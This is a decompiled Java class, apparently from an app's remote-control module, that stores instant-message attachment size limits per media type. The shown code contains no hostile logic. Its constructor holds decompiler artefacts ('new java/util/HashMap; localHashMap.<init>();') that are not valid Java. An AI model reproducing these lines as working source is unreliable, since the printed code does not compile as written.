package com.vvt.remotecontrol.input;

import java.io.Serializable;
import java.util.HashMap;
import java.util.Map;

public class RmtCtrlInputImAttachmentLimitSize
  implements Serializable
{
  public static final int AUDIO = 1;
  public static final int IMAGE = 0;
  public static final int NON_MEDIA = 3;
  public static final int VIDEO = 2;
  private static final long serialVersionUID = -3019826736076883261L;
  private Map mImAttachmentLimitSizeMap;
  
  public RmtCtrlInputImAttachmentLimitSize()
  {
    HashMap localHashMap = new java/util/HashMap;
    localHashMap.<init>();
    this.mImAttachmentLimitSizeMap = localHashMap;
  }
  
  public Long getImAttchmentLimitSize(int paramInt)
  {
    Map localMap = this.mImAttachmentLimitSizeMap;
    Integer localInteger = Integer.valueOf(paramInt);
    return (Long)localMap.get(localInteger);
  }
  
  public Map getImAttchmentLimitSizeMap()
  {
    return this.mImAttachmentLimitSizeMap;
  }
  
  public void setImAttchmentLimitSize(int paramInt, long paramLong)
  {
    Map localMap = this.mImAttachmentLimitSizeMap;
    Integer localInteger = Integer.valueOf(paramInt);
    Long localLong = Long.valueOf(paramLong);
    localMap.put(localInteger, localLong);
  }
  
  public void setImAttchmentLimitSizeMap(HashMap paramHashMap)
  {
    this.mImAttachmentLimitSizeMap = paramHashMap;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecontrol/input/RmtCtrlInputImAttachmentLimitSize.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */